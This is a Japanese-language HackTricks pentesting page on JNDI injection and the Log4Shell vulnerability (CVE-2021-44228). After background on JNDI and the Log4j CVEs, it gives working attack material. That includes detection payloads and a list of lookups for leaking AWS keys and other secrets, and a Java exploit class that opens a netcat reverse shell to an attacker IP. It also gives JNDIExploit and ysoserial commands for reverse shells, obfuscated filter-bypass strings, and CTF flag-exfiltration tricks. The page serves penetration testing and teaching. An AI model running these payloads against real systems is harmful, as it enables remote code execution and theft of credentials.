# JNDI - Java Naming and Directory Interface & Log4Shell

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業で働いていますか？** **HackTricksで会社を宣伝**したいですか？または、**PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロード**したいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を見つけてください。独占的な[**NFT**](https://opensea.io/collection/the-peass-family)のコレクションです。
* [**公式のPEASS＆HackTricks swag**](https://peass.creator-spring.com)を手に入れましょう。
* [**💬**](https://emojipedia.org/speech-balloon/) [**Discordグループ**](https://discord.gg/hRep4RUj7f)または[**telegramグループ**](https://t.me/peass)に**参加**するか、**Twitter**で**フォロー**してください[**🐦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks_live)**。**
* **ハッキングのトリックを共有する**ために、[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **と** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **にPRを提出してください。**

</details>

## 基本情報

JNDIは1990年代後半からJavaに存在しています。これは、**名前サービスを使用してディレクトリを介してデータを検索するためのJavaプログラムを可能にするディレクトリサービス**です。名前サービスは値（バインディング）を関連付けるため、ディレクトリ内の参照を介して取得できます。

JNDIには、さまざまなディレクトリサービスを使用するための**サービスプロバイダインタフェース（SPI）**があります。 JNDIの目標は、他のシステムからデータを非常に簡単に取得することです。さらに、リモートでJavaオブジェクトを取得することもできますが、そこで問題が発生します。

たとえば、**CORBA COS**（Common Object Service）、**Java RMI**（Remote Method Interface）レジストリ、**LDAP**にはSPIが存在します。

![](<../../.gitbook/assets/image (627).png>)

### JNDI Naming Reference

Javaオブジェクトをシリアライズしてバイナリ表現を保存することで、Javaオブジェクトを取得することができます。ただし、これが機能しない場合もあります（データが大きすぎる場合など）。\
Javaオブジェクトをより簡単に保存するために、**Naming References**が使用されます。\
2つのタイプのNaming Referencesがあります。

* **Reference Addresses**：これはオブジェクトのアドレスを示します（_rmi://server/ref_）。その後、**そのアドレスからオブジェクトが取得**されます。
* **Remote Factory**：この場合、JNDI参照に**リモートファクトリクラス**が指定されます。その後、JNDIアドレスに従ってリモートクラスがリモートファクトリから取得され、**クラスがダウンロードおよびロード**されます。

これは危険です。**攻撃者はシステムに任意のオブジェクトをロードし、任意のコードを実行**する可能性があるため、いくつかの保護策が存在します。

* **RMI**：デフォルトでは`java.rmi.server.useCodeabseOnly = true`（**JDK 7u21**以降）であり、それ以外の場合はカスタムJavaオブジェクトをリモートでロードできます。さらに、保護が無効になっていても、**セキュリティマネージャ**が構成されているため、ロードできるものを設定できます。
* **LDAP**：デフォルトでは`com.sun.jndi.ldap.object.trustURLCodebase = false`（**JDK 6u141、7u131、8u121**以降）であり、任意のJavaオブジェクトをダウンロードして実行することはできません。ただし、これを`true`に設定すると、実行できますが、**セキュリティマネージャは強制されません**。
* **CORBA**：設定するプロパティはありませんが、**セキュリティマネージャは常に強制されます**。

さらに、JNDIリンクをたどる**Naming Manager**にはセキュリティマネージャや設定するプロパティがないため、常にオブジェクトを取得しようとします。

一般的に、保護策は十分ではありません。ランダムなアドレスからのJNDIのロードに対する保護はなく、RMI、LDAP、CORBAの保護策はバイパスされる可能性があります（設定による）ため、任意のJavaオブジェクトをロードしたり、アプリケーション内の既存のコンポーネントを悪用するためのガジェットとしてJavaオブジェクトをロードしたりすることができます。

JNDIを悪用するためのURLの例：

* _rmi://attacker-server/bar_
* _ldap://attacker-server/bar_
* _iiop://attacker-server/bar_

### JNDIの例

![](<../../.gitbook/assets/image (655) (1) (1).png>)

**`PROVIDER_URL`**を設定していても、lookupで異なるURLを指定することができます：`ctx.lookup("<attacker-controlled-url>")`。これが攻撃者が自身が制御するシステムから任意のオブジェクトをロードするために悪用する方法です。

### CORBA

**相互運用可能なオブジェクトリファレンス（IOR）**は、リモートCORBAサーバー上のオブジェクトを一意に識別するCORBAまたはRMI-IIOPリファレンスです。IORはバイナリ形式またはバイナリの16進数表現の文字列で存在します。\
その他の情報の中には、**Type ID**（インターフェースの一意の識別子）と**Codebase**（スタブクラスを取得するために使用するリモートの場所）が含まれます。\
デフォルトでは、**CORBAは悪用できません**。\
次のものが必要です。

* **セキュリティマネージャをインストールする必要があります**
* 攻撃者が制御する**コードベースへの接続をセキュリティマネージャが許可する**必要があります。これを許可するためのさまざまな方法があります。
* ソケットの許可：`permissions java.net.SocketPermission "*:1098-1099", "connect";`
* すべてのファイルを読み取るためのファイルの許可：`permission java.io.FilePermission "<<ALL FILES>>", "read";`
* 攻撃者がエクスプロイト（クラスまたはzipアーカイブ）をアップロードできるフォルダを読み取るためのファイルの許可

**デフォルトでこれを許可するベンダーのポリシー**が見つかるかもしれません。
### RMI

前の**JNDI Naming Referenceセクションで示されているように、デフォルトではRMIは任意のJavaクラスのダウンロードを許可しません**。さらに、許可された場合でも、**セキュリティマネージャーポリシーをバイパスする必要があります**（前のセクションでは、これがCORBAで可能であることを学びました）。

### LDAP

まず、検索とルックアップを区別する必要があります。\
**検索**は、`ldap://localhost:389/o=JNDITutorial`のようなURLを使用して、LDAPサーバーからJNDITutorialオブジェクトを見つけてその属性を**取得します**。\
**ルックアップ**は、**名前にバインドされているものを取得するためのネーミングサービス**です。

LDAP検索が**SearchControls.setReturningObjFlag()を`true`で呼び出された場合、返されたオブジェクトは再構築されます**。

したがって、これらのオプションを攻撃する方法はいくつかあります。\
**攻撃者は、LDAPレコードにペイロードを挿入して、それらを収集するシステムで実行される**（LDAPサーバーにアクセスできる場合、多数のマシンを侵害するのに非常に便利です）。これを悪用する別の方法は、例えばLDAP検索で**MitM攻撃を実行する**ことです。

アプリケーションがJNDI LDAP URLを解決することができる場合、検索されるLDAPを制御でき、エクスプロイト（log4shell）を送り返すことができます。

#### シリアライゼーションエクスプロイト

![](<../../.gitbook/assets/image (654) (1) (1) (1).png>)

**エクスプロイトはシリアライズされ、デシリアライズされます**。\
`trustURLCodebase`が`true`の場合、攻撃者はコードベースに独自のクラスを提供できます。そうでない場合は、クラスパスのガジェットを悪用する必要があります。

#### JNDIリファレンスエクスプロイト

このLDAPを攻撃するのは**JavaFactoryリファレンス**を使用する方が簡単です。

![](<../../.gitbook/assets/image (660) (1) (1).png>)

## Log4Shell脆弱性

この脆弱性は、Log4jが[**特殊な構文**](https://logging.apache.org/log4j/2.x/manual/configuration.html#PropertySubstitution)をサポートしているために導入されます。この構文は`${prefix:name}`の形式で、`prefix`はさまざまな[**Lookups**](https://logging.apache.org/log4j/2.x/manual/lookups.html)の1つであり、`name`は評価されるべきです。例えば、`${java:version}`は現在実行中のJavaのバージョンです。

[**LOG4J2-313**](https://issues.apache.org/jira/browse/LOG4J2-313)では、次のように`jndi` Lookupが追加されました。「JndiLookupはJNDIを介して変数を取得することができます。デフォルトでは、キーはjava:comp/env/で接頭辞が付けられますが、キーに**":"が含まれている場合は接頭辞は追加されません**。」

キーに**":"が含まれている場合、`${jndi:ldap://example.com/a}`のように、接頭辞はなくなり、LDAPサーバーがオブジェクトをクエリします。これらのLookupsは、Log4jの設定だけでなく、ログが記録されるときにも使用できます。

したがって、RCEを得るためには、**ユーザーが制御する情報を処理する脆弱なバージョンのLog4jが必要です**。そして、これはJavaアプリケーションで広く使用されているライブラリであり、HTTPヘッダーなどの受信した情報（インターネットに面したアプリケーションも含む）をログに記録するためにlog4jが非常に一般的であることがよくありました。ただし、log4jはHTTP情報だけでなく、開発者が指定した任意の入力とデータをログに記録するために使用されます。

## Log4Shell CVE

* [**CVE-2021-44228**](https://nvd.nist.gov/vuln/detail/CVE-2021-44228) **\[Critical]**: オリジナルの「Log4Shell」脆弱性は、[信頼されていないデシリアライゼーション](https://cwe.mitre.org/data/definitions/502.html)の欠陥です。重大度はクリティカルで、この脆弱性は[CVSS](https://www.first.org/cvss/)スケールで10点を獲得し、認証されていない攻撃者にリモートコード実行（RCE）の機能を与え、完全なシステム乗っ取りを許可します。\
\
11月24日にアリババクラウドセキュリティチームのChen Zhaojun氏がApacheに報告したCVE-2021-44228は、Apache Struts2、Apache Solr、Apache Druid、Apache Flinkなど、複数のApacheフレームワークのデフォルト構成に影響を与えます。\
\
最も危険な脆弱性であるこの脆弱性は、[log4j-core](https://search.maven.org/artifact/org.apache.logging.log4j/log4j-core)コンポーネントに存在し、2.xバージョンの2.0-beta9から2.14.1までの範囲に制限されています。Log4Shellの修正はバージョン2.15.0でリリースされましたが、不完全とされました（後続の内容を参照）。\
\
脅威インテリジェンスアナリストのFlorian Roth氏は、防御策の1つとして使用できるSigmaルール\[[1](https://github.com/SigmaHQ/sigma/blob/master/rules/web/web\_cve\_2021\_44228\_log4j\_fields.yml), [2](https://github.com/SigmaHQ/sigma/blob/master/rules/web/web\_cve\_2021\_44228\_log4j.yml)]を共有しています。\\
* [**CVE-2021-45046**](https://nvd.nist.gov/vuln/detail/CVE-2021-45046) \[**Critical**、以前はLow]: これはDoS（サービス拒否）の欠陥で、3.7から9.0にスコアリングされます。この欠陥は、CVE-2021-44228の2.15.0への不完全な修正の結果として発生しました。2.15.0への修正は、欠陥をほとんど解決しましたが、**非デフォルトの構成**には当てはまりませんでした。\
\
Log4j 2.15.0は、デフォルトでJNDI LDAPルックアップを\_localhostに制限するための「ベストエフォート」を行います。ただし、**スレッドコンテキストマップ（MDC）の入力データを制御できる攻撃者**は、JNDIルックアップパターンを介して悪意のあるペイロードを作成してDoS攻撃を引き起こすことができます。これは、非デフォルトの構成で、コンテキストル
## Log4Shellの悪用

### 発見

この脆弱性は非常に簡単に発見できます。なぜなら、ペイロードで指定したアドレスに少なくとも**DNSリクエスト**が送信されるからです。したがって、以下のようなペイロードがあります。

* `${jndi:ldap://x${hostName}.L4J.lt4aev8pktxcq2qlpdr5qu5ya.canarytokens.com/a}`（[canarytokens.com](https://canarytokens.org/generate)を使用）
* `${jndi:ldap://c72gqsaum5n94mgp67m0c8no4hoyyyyyn.interact.sh}`（[interactsh](https://github.com/projectdiscovery/interactsh)を使用）
* `${jndi:ldap://abpb84w6lqp66p0ylo715m5osfy5mu.burpcollaborator.net}`（Burp Suiteを使用）
* `${jndi:ldap://2j4ayo.dnslog.cn}`（[dnslog](http://dnslog.cn)を使用）
* `${jndi:ldap://log4shell.huntress.com:1389/hostname=${env:HOSTNAME}/fe47f5ee-efd7-42ee-9897-22d18976c520}`（[huntress](https://log4shell.huntress.com)を使用）

**DNSリクエストが受信されたからといって、アプリケーションが悪用可能**（または脆弱性がある）であるということではありません。悪用を試みる必要があります。

{% hint style="info" %}
バージョン2.15を**悪用するには、localhostのチェックバイパス**を追加する必要があります：${jndi:ldap://**127.0.0.1#**...}
{% endhint %}

#### **ローカルの発見**

次のコマンドで、ライブラリの**ローカルの脆弱なバージョン**を検索します。
```bash
find / -name "log4j-core*.jar" 2>/dev/null | grep -E "log4j\-core\-(1\.[^0]|2\.[0-9][^0-9]|2\.1[0-6])"
```
### **検証**

以前にリストアップされたいくつかのプラットフォームでは、要求されたときにログに記録される変数データを挿入することができます。\
これは2つのことに非常に役立ちます。

* 脆弱性を**検証**するために
* 脆弱性を悪用して情報を**外部流出**するために

例えば、次のようなリクエストを送信することができます:\
`${`**`jndi:ldap://jv-${sys:java.version}-hn-${hostName}.ei4frk.dnslog.cn/a}`** と、もし環境変数の値を含む**DNSリクエストが受信された場合**、アプリケーションは脆弱性があることがわかります。

他にも漏洩させることができる情報は以下の通りです:
```
${env:AWS_ACCESS_KEY_ID}
${env:AWS_CONFIG_FILE}
${env:AWS_PROFILE}
${env:AWS_SECRET_ACCESS_KEY}
${env:AWS_SESSION_TOKEN}
${env:AWS_SHARED_CREDENTIALS_FILE}
${env:AWS_WEB_IDENTITY_TOKEN_FILE}
${env:HOSTNAME}
${env:JAVA_VERSION}
${env:PATH}
${env:USER}
${hostName}
${java.vendor}
${java:os}
${java:version}
${log4j:configParentLocation}
${sys:PROJECT_HOME}
${sys:file.separator}
${sys:java.class.path}
${sys:java.class.path}
${sys:java.class.version}
${sys:java.compiler}
${sys:java.ext.dirs}
${sys:java.home}
${sys:java.io.tmpdir}
${sys:java.library.path}
${sys:java.specification.name}
${sys:java.specification.vendor}
${sys:java.specification.version}
${sys:java.vendor.url}
${sys:java.vendor}
${sys:java.version}
${sys:java.vm.name}
${sys:java.vm.specification.name}
${sys:java.vm.specification.vendor}
${sys:java.vm.specification.version}
${sys:java.vm.vendor}
${sys:java.vm.version}
${sys:line.separator}
${sys:os.arch}
${sys:os.name}
${sys:os.version}
${sys:path.separator}
${sys:user.dir}
${sys:user.home}
${sys:user.name}

Any other env variable name that could store sensitive information
```
### RCE情報

{% hint style="info" %}
**JDKのバージョンが6u141、7u131、8u121よりも高いホストは、LDAPクラスの読み込みベクトルに対して保護されますが、逆シリアル化ベクトルには保護されません**。これは、`com.sun.jndi.ldap.object.trustURLCodebase`がデフォルトで無効化されているため、JNDIがLDAPを使用してリモートコードベースを読み込むことができないためです。ただし、逆シリアル化と変数の漏洩は引き続き可能です。\
これはつまり、**上記のバージョンを悪用するには、Javaアプリケーション上に存在するいくつかの信頼されたガジェットを悪用する必要があります（例えば、ysoserialやJNDIExploitを使用する）**。ただし、より低いバージョンを悪用するには、任意のクラスをロードして実行させることができます（これにより攻撃が容易になります）。

**詳細な情報**（RMIおよびCORBAベクトルの制限など）については、**前のJNDI Naming Referenceセクション**または[https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/](https://jfrog.com/blog/log4shell-0-day-vulnerability-all-you-need-to-know/)を参照してください。
{% endhint %}

### RCE - カスタムペイロードを使用したMarshalsec

_このトリックは、**THMボックス**から完全に引用されています:_ [_**https://tryhackme.com/room/solar**_](https://tryhackme.com/room/solar)\_\_

この攻撃では、ツール[**marshalsec**](https://github.com/mbechler/marshalsec)（[**ここからjarバージョンをダウンロード**](https://github.com/RandomRobbieBF/marshalsec-jar)）を使用して、LDAPリファラルサーバーを作成し、接続をセカンダリHTTPサーバーにリダイレクトし、そこで攻撃が提供されます。
```bash
java -cp marshalsec-0.0.3-SNAPSHOT-all.jar marshalsec.jndi.LDAPRefServer "http://<your_ip_http_server>:8000/#Exploit"
```
被害者に逆シェルを送信するコードを読み込ませたいので、以下の内容でExploit.javaという名前のJavaファイルを作成します。

{% code title="" %}
```java
public class Exploit {
static {
try {
java.lang.Runtime.getRuntime().exec("nc -e /bin/bash YOUR.ATTACKER.IP.ADDRESS 9999");
} catch (Exception e) {
e.printStackTrace();
}
}
}
```
{% endcode %}

**クラスファイル**を作成するには、`javac Exploit.java -source 8 -target 8`を実行し、その後、クラスファイルが作成された同じディレクトリで**HTTPサーバー**を実行します：`python3 -m http.server`。\
**marshalsecのLDAPサーバーは、このHTTPサーバーを指すように設定する必要があります**。\
その後、脆弱なWebサーバーに対して以下のようなペイロードを送信することで、**エクスプロイトクラスを実行**させることができます：
```bash
${jndi:ldap://<LDAP_IP>:1389/Exploit}
```
### RCE - **JNDIExploit**

{% hint style="info" %}
JavaがLDAPを使用してリモートコードベースをロードするように設定されていない場合、このカスタムエクスプロイトは機能しません。その場合、信頼されたクラスを悪用して任意のコードを実行する必要があります。
{% endhint %}

この例では、ポート8080でこの**log4shellの脆弱なウェブサーバー**を実行するだけでよいです: [https://github.com/christophetd/log4shell-vulnerable-app](https://github.com/christophetd/log4shell-vulnerable-app) (_READMEに実行方法が記載されています_）。この脆弱なアプリは、HTTPリクエストヘッダーの内容である_X-Api-Version_を脆弱なバージョンのlog4shellでログに記録しています。

次に、**JNDIExploit**のjarファイルをダウンロードし、次のコマンドで実行します:
```bash
wget https://web.archive.org/web/20211210224333/https://github.com/feihong-cs/JNDIExploit/releases/download/v1.2/JNDIExploit.v1.2.zip
unzip JNDIExploit.v1.2.zip
java -jar JNDIExploit-1.2-SNAPSHOT.jar -i 172.17.0.1 -p 8888 # Use your private IP address and a port where the victim will be able to access
```
コードを数分読んだ後、_com.feihong.ldap.LdapServer_と_com.feihong.ldap.HTTPServer_では、**LDAPサーバーとHTTPサーバーが作成される**方法がわかります。LDAPサーバーはどのペイロードを提供する必要があるかを理解し、被害者をHTTPサーバーにリダイレクトし、そこでエクスプロイトを提供します。\
_com.feihong.ldap.gadgets_では、望ましいアクション（任意のコードを実行する可能性がある）を実行するために使用できる**特定のガジェット**が見つかります。そして、_com.feihong.ldap.template_では、エクスプロイトを**生成するための異なるテンプレートクラス**が表示されます。

**`java -jar JNDIExploit-1.2-SNAPSHOT.jar -u`**で利用可能なすべてのエクスプロイトを確認できます。いくつかの便利なものは次のとおりです：
```bash
ldap://null:1389/Basic/Dnslog/[domain]
ldap://null:1389/Basic/Command/Base64/[base64_encoded_cmd]
ldap://null:1389/Basic/ReverseShell/[ip]/[port]
# But there are a lot more
```
したがって、この例では、すでに脆弱なDockerアプリが実行されているとします。攻撃するためには、以下の手順を実行します。
```bash
# Create a file inside of th vulnerable host:
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/Command/Base64/dG91Y2ggL3RtcC9wd25lZAo=}'

# Get a reverse shell (only unix)
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/ReverseShell/172.17.0.1/4444}'
curl 127.0.0.1:8080 -H 'X-Api-Version: ${jndi:ldap://172.17.0.1:1389/Basic/Command/Base64/bmMgMTcyLjE3LjAuMSA0NDQ0IC1lIC9iaW4vc2gK}'
```
攻撃を送信する際には、**JNDIExploit-1.2-SNAPSHOT.jar**を実行したターミナルでいくつかの出力が表示されます。

他の攻撃オプションを確認するには、`java -jar JNDIExploit-1.2-SNAPSHOT.jar -u`をチェックしてください。また、LDAPとHTTPサーバーのポートを変更することもできます。

### RCE - JNDI-Exploit-Kit <a href="#rce__jndiexploitkit_33" id="rce__jndiexploitkit_33"></a>

前の攻撃と同様に、この脆弱性を悪用するために[**JNDI-Exploit-Kit**](https://github.com/pimps/JNDI-Exploit-Kit)を使用することもできます。\
被害者に送信するためのURLを生成するには、次のコマンドを実行します：
```bash
# Get reverse shell in port 4444 (only unix)
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 172.17.0.1:1389 -J 172.17.0.1:8888 -S 172.17.0.1:4444

# Execute command
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 172.17.0.1:1389 -J 172.17.0.1:8888 -C "touch /tmp/log4shell"
```
_このカスタム生成されたJavaオブジェクトを使用した攻撃は、**THMソーラールーム**のようなラボで動作します。ただし、これは一般的には機能しません（デフォルトではJavaはLDAPを使用してリモートコードベースをロードするように設定されていないためだと思われます）。これは、信頼されたクラスを悪用して任意のコードを実行するものではないためです。_

### RCE - ysoserial & JNDI-Exploit-Kit

このオプションは、**指定されたクラスのみを信頼し、すべてのクラスを信頼しないように構成されたJavaバージョン**を攻撃するのに非常に便利です。したがって、**ysoserial**を使用して、**信頼されたクラスのシリアライズ**を生成し、それをガジェットとして使用して**任意のコードを実行**することができます（_ysoserialによって悪用される信頼されたクラスは、エクスプロイトが機能するために被害者のJavaプログラムで使用される必要があります_）。

**ysoserial**または[**ysoserial-modified**](https://github.com/pimps/ysoserial-modified)を使用すると、JNDIによってダウンロードされるデシリアライズエクスプロイトを作成できます。
```bash
# Rev shell via CommonsCollections5
java -jar ysoserial-modified.jar CommonsCollections5 bash 'bash -i >& /dev/tcp/10.10.14.10/7878 0>&1' > /tmp/cc5.ser
```
[**JNDI-Exploit-Kit**](https://github.com/pimps/JNDI-Exploit-Kit)を使用して、脆弱なマシンからの接続を待つための**JNDIリンク**を生成します。JNDI-Exploit-Kitによって自動的に生成される**さまざまなエクスプロイト**またはあなた自身やysoserialによって生成された**独自の逆シリアル化ペイロード**を提供することもできます。
```bash
java -jar JNDI-Injection-Exploit-1.0-SNAPSHOT-all.jar -L 10.10.14.10:1389 -P /tmp/cc5.ser
```
![](<../../.gitbook/assets/image (642) (1) (1).png>)

これで、生成されたJNDIリンクを使用して脆弱性を悪用し、**`${ldap://10.10.14.10:1389/generated}`**を脆弱なバージョンのlog4jに送信するだけで、**逆シェル**を簡単に取得できます。

### バイパス方法
```java
${${env:ENV_NAME:-j}ndi${env:ENV_NAME:-:}${env:ENV_NAME:-l}dap${env:ENV_NAME:-:}//attackerendpoint.com/}
${${lower:j}ndi:${lower:l}${lower:d}a${lower:p}://attackerendpoint.com/}
${${upper:j}ndi:${upper:l}${upper:d}a${lower:p}://attackerendpoint.com/}
${${::-j}${::-n}${::-d}${::-i}:${::-l}${::-d}${::-a}${::-p}://attackerendpoint.com/z}
${${env:BARFOO:-j}ndi${env:BARFOO:-:}${env:BARFOO:-l}dap${env:BARFOO:-:}//attackerendpoint.com/}
${${lower:j}${upper:n}${lower:d}${upper:i}:${lower:r}m${lower:i}}://attackerendpoint.com/}
${${::-j}ndi:rmi://attackerendpoint.com/} //Notice the use of rmi
${${::-j}ndi:dns://attackerendpoint.com/} //Notice the use of dns
${${lower:jnd}${lower:${upper:ı}}:ldap://...} //Notice the unicode "i"
```
### 自動スキャナー

* [https://github.com/fullhunt/log4j-scan](https://github.com/fullhunt/log4j-scan)
* [https://github.com/adilsoybali/Log4j-RCE-Scanner](https://github.com/adilsoybali/Log4j-RCE-Scanner)
* [https://github.com/silentsignal/burp-log4shell](https://github.com/silentsignal/burp-log4shell)
* [https://github.com/cisagov/log4j-scanner](https://github.com/cisagov/log4j-scanner)
* [https://github.com/Qualys/log4jscanwin](https://github.com/Qualys/log4jscanwin)
* [https://github.com/hillu/local-log4j-vuln-scanner](https://github.com/hillu/local-log4j-vuln-scanner)
* [https://github.com/logpresso/CVE-2021-44228-Scanner](https://github.com/logpresso/CVE-2021-44228-Scanner)
* [https://github.com/palantir/log4j-sniffer](https://github.com/palantir/log4j-sniffer) - 脆弱なライブラリをローカルで検出する

### テスト用のラボ

* [**LogForge HTBマシン**](https://app.hackthebox.com/tracks/UHC-track)
* [**Try Hack Me Solar room**](https://tryhackme.com/room/solar)
* [**https://github.com/leonjza/log4jpwn**](https://github.com/leonjza/log4jpwn)
* [**https://github.com/christophetd/log4shell-vulnerable-app**](https://github.com/christophetd/log4shell-vulnerable-app)

## Log4Shellの脆弱性を悪用した後

この[**CTFの解説記事**](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/)では、**Log4J**の一部の機能を**悪用**することが**可能**であることが詳しく説明されています。

Log4jの[**セキュリティページ**](https://logging.apache.org/log4j/2.x/security.html)には興味深い文がいくつかあります：

> バージョン2.16.0（Java 8用）からは、**メッセージルックアップ機能が完全に削除**されました。**設定内のルックアップは引き続き機能します**。さらに、Log4jはデフォルトでJNDIへのアクセスを無効にします。設定内のJNDIルックアップを有効にする必要があります。

> バージョン2.17.0（およびJava 7およびJava 6用の2.12.3および2.3.1）からは、**設定内のルックアップ文字列のみが再帰的に展開**されます。他の使用方法では、トップレベルのルックアップのみが解決され、ネストされたルックアップは解決されません。

これは、デフォルトでは**`jndi`の脆弱性を使用することはできない**ことを意味します。さらに、**再帰的なルックアップ**を実行するには、それらを設定する必要があります。

例えば、このCTFでは、次のようにlog4j2.xmlファイルで設定されていました：
```xml
<Console name="Console" target="SYSTEM_ERR">
<PatternLayout pattern="%d{HH:mm:ss.SSS} %-5level %logger{36} executing ${sys:cmd} - %msg %n">
</PatternLayout>
</Console>
```
### Env Lookups

このCTFでは、攻撃者は`${sys:cmd}`の値を制御し、環境変数からフラグを外部に持ち出す必要がありました。[**前のペイロード**](jndi-java-naming-and-directory-interface-and-log4shell.md#verification)のページで見られるように、**`${env:FLAG}`**などの異なる方法で環境変数にアクセスすることができます。このCTFではこれは役に立ちませんでしたが、他の現実のシナリオでは役に立つかもしれません。

### Exfiltration in Exceptions

CTFでは、log4Jを使用してJavaアプリケーションのstderrにアクセスすることはできませんでしたが、Log4Jの例外はstdoutに送信され、Pythonアプリケーションで表示されました。これは、例外をトリガーすることでコンテンツにアクセスできることを意味します。フラグを外部に持ち出すための例外は次のとおりです：**`${java:${env:FLAG}}`**。これは、**`${java:CTF{blahblah}}`**が存在せず、フラグの値が表示される例外が表示されるため機能します：

![](<../../.gitbook/assets/image (157).png>)

### Conversion Patterns Exceptions

言及するだけですが、新しい[**変換パターン**](https://logging.apache.org/log4j/2.x/manual/layouts.html#PatternLayout)を注入し、`stdout`にログ出力される例外をトリガーすることもできます。例えば：

![](<../../.gitbook/assets/image (3) (2) (1) (1).png>)

これは、エラーメッセージ内の日付を外部に持ち出すのには役に立ちませんでした。なぜなら、変換パターンよりもルックアップが先に解決されなかったからですが、検出などの他の用途には役立つかもしれません。

### Conversion Patterns Regexes

ただし、正規表現をサポートするいくつかの変換パターンを使用して、正規表現を使用してルックアップから情報を外部に持ち出すことが可能です。これは、**バイナリサーチ**または**時間ベース**の動作を濫用することができます。

* **例外メッセージを使用したバイナリサーチ**

変換パターン**`%replace`**は、**文字列**内の**コンテンツ**を**正規表現**を使用して**置換**するために使用できます。次のように機能します：`replace{pattern}{regex}{substitution}`\
この動作を濫用することで、文字列内に正規表現が一致する場合には例外をトリガーし（一致しない場合は例外をトリガーしない）、次のようにします：
```bash
%replace{${env:FLAG}}{^CTF.*}{${error}}
# The string searched is the env FLAG, the regex searched is ^CTF.*
## and ONLY if it's found ${error} will be resolved with will trigger an exception
```
* **タイムベース**

前のセクションで述べたように、**`%replace`**は**正規表現**をサポートしています。したがって、[**ReDoSページ**](../regular-expression-denial-of-service-redos.md)からのペイロードを使用して、フラグが見つかった場合に**タイムアウト**を引き起こすことが可能です。\
たとえば、`%replace{${env:FLAG}}{^(?=CTF)((.`_`)`_`)*salt$}{asd}`のようなペイロードは、そのCTFで**タイムアウト**を引き起こします。

この[**解説記事**](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/)では、ReDoS攻撃ではなく、**増幅攻撃**を使用して応答の時間差を引き起こしました。

> ```
> /%replace{
> %replace{
> %replace{
> %replace{
> %replace{
> %replace{
> %replace{${ENV:FLAG}}{CTF\{" + flagGuess + ".*\}}{#############################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> }{#}{######################################################}
> ```
>
> フラグが`flagGuess`で始まる場合、フラグ全体が29個の`#`で置き換えられます（この文字を使用したのは、おそらくフラグの一部ではないためです）。**その29個の`#`のそれぞれが54個の`#`で置き換えられます**。このプロセスは**6回繰り返され、合計で` 29*54*54^6* =`` `` `**`96816014208`  `#`**が生成されます！**
>
> これだけの数の`#`を置き換えると、Flaskアプリケーションの10秒タイムアウトが発生し、ユーザーにHTTPステータスコード500が送信されます（フラグが`flagGuess`で始まらない場合、非500のステータスコードが受信されます）

## 参考文献

* [https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/](https://blog.cloudflare.com/inside-the-log4j2-vulnerability-cve-2021-44228/)
* [https://www.bleepingcomputer.com/news/security/all-log4j-logback-bugs-we-know-so-far-and-why-you-must-ditch-215/](https://www.bleepingcomputer.com/news/security/all-log4j-logback-bugs-we-know-so-far-and-why-you-must-ditch-215/)
* [https://www.youtube.com/watch?v=XG14EstTgQ4](https://www.youtube.com/watch?v=XG14EstTgQ4)
* [https://tryhackme.com/room/solar](https://tryhackme.com/room/solar)
* [https://www.youtube.com/watch?v=Y8a5nB-vy78](https://www.youtube.com/watch?v=Y8a5nB-vy78)
* [https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf](https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf)
* [https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/](https://intrigus.org/research/2022/07/18/google-ctf-2022-log4j2-writeup/)
* [https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/](https://sigflag.at/blog/2022/writeup-googlectf2022-log4j/)

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>☁️ HackTricks Cloud ☁️</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>🐦 Twitter 🐦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>🎙️ Twitch 🎙️</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>🎥 Youtube 🎥</strong></a></summary>

* **サイバーセキュリティ企業**で働いていますか？ HackTricksであなたの会社を宣伝したいですか？または、PEASSの最新バージョンにアクセスしたり、HackTricksをPDFでダウンロードしたりしたいですか？[**SUBSCRIPTION PLANS**](https://github.com/sponsors/carlospolop)をチェックしてください！
* [**The PEASS Family**](https://opensea.io/collection/the-peass-family)を発見しましょう、私たちの独占的な[NFT](https://opensea.io/collection/the-peass-family)のコレクション
* [**公式のPEASS＆HackTricksのグッズ**](https://peass.creator-spring.com)を手に入れましょう
